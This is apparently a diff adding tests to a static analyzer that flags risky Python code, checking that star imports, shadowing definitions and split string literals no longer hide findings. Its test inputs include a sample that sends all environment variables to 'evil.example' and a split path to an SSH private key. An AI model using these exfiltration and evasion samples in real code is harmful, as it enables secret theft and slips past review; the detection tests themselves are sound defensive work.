@@ -257,6 +257,109 @@ def test_pathlib_open_for_reading_records_a_read():
     assert ("filesystem", "read") in _domains(analysis)
 
 
+def test_star_import_still_resolves_the_sinks_it_binds():
+    """``from os import *`` must not erase ``system`` from the resolver."""
+    analysis = _analyze("from os import *\ndef f(c):\n    system(c)\n")
+    assert "code.shell.os_system" in _rules(analysis)
+    assert ("shell", "execute") in _domains(analysis)
+
+
+def test_star_import_from_a_sink_owning_module_is_flagged():
+    """The names it binds appear nowhere in the file, so it is unreviewable."""
+    analysis = _analyze("from urllib.request import *\n")
+    assert "code.exec.star_import" in _rules(analysis)
+    assert _severity(analysis, "code.exec.star_import") == "high"
+
+
+def test_star_import_from_an_ordinary_module_is_not_flagged():
+    """The rule is about sink-owning modules, not star-imports as a style."""
+    analysis = _analyze("from dataclasses import *\nfrom typing import *\n")
+    assert analysis.findings == ()
+
+
+def test_star_import_credential_exfiltrator_is_not_silent():
+    """A working exfiltrator used to score zero findings and zero domains."""
+    analysis = _analyze(
+        "from os import *\n"
+        "from urllib.request import *\n"
+        "def go():\n"
+        "    urlopen('https://evil.example/?d=' + str(environ))\n"
+    )
+    assert "code.env.bulk_read" in _rules(analysis)
+    assert ("network", "read") in _domains(analysis)
+    assert ("env", "read") in _domains(analysis)
+
+
+def test_environ_imported_by_name_still_records_the_bulk_read():
+    analysis = _analyze("from os import environ\ndef f():\n    return dict(environ)\n")
+    assert "code.env.bulk_read" in _rules(analysis)
+    assert ("env", "read") in _domains(analysis)
+
+
+def test_a_shadowing_def_in_an_unrelated_scope_does_not_disable_the_rule():
+    """A dead nested ``def eval`` used to switch the rule off file-wide."""
+    analysis = _analyze(
+        "def _decoy():\n"
+        "    def eval(x):\n"
+        "        return x\n"
+        "\n"
+        "def run(p):\n"
+        "    return eval(p)\n"
+    )
+    assert "code.exec.eval" in _rules(analysis)
+    assert _severity(analysis, "code.exec.eval") == "critical"
+
+
+def test_a_method_named_like_a_builtin_does_not_shadow_the_module():
+    """``class H: def open`` used to erase the filesystem domain entirely."""
+    analysis = _analyze(
+        "class H:\n"
+        "    def open(self):\n"
+        "        return None\n"
+        "\n"
+        "def run(p):\n"
+        "    return open(p).read()\n"
+    )
+    assert ("filesystem", "read") in _domains(analysis)
+
+
+def test_a_shadowing_def_still_suppresses_calls_in_its_own_scope():
+    """Scope-awareness must not cost the real shadowing case its silence."""
+    analysis = _analyze(
+        "def f(x):\n"
+        "    def eval(value):\n"
+        "        return value\n"
+        "    return eval(x)\n"
+    )
+    assert "code.exec.eval" not in _rules(analysis)
+
+
+def test_a_credential_path_split_across_concatenated_literals_is_flagged():
+    """``+`` changes nothing at runtime; it must change nothing here."""
+    analysis = _analyze('def f():\n    return open("~/.ss" + "h/id_" + "rsa")\n')
+    assert "code.credentials.file_access" in _rules(analysis)
+    assert _severity(analysis, "code.credentials.file_access") == "high"
+
+
+def test_a_split_credential_path_is_reported_once_not_per_fragment():
+    analysis = _analyze('P = "~/.ss" + "h/id_rsa"\n')
+    matches = [
+        f for f in analysis.findings if f.rule_id == "code.credentials.file_access"
+    ]
+    assert len(matches) == 1
+
+
+def test_a_blob_split_across_concatenated_literals_is_flagged():
+    half = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9w" * 2
+    analysis = _analyze(f'PAYLOAD = "{half}" + "{half}"\n')
+    assert "code.obfuscation.blob" in _rules(analysis)
+
+
+def test_a_computed_concatenation_is_not_folded_into_a_false_positive():
+    analysis = _analyze('def f(name):\n    return open("reports/" + name + ".md")\n')
+    assert "code.credentials.file_access" not in _rules(analysis)
+
+
 # ----------------------------------------------------------------------
 # Network
 # ----------------------------------------------------------------------
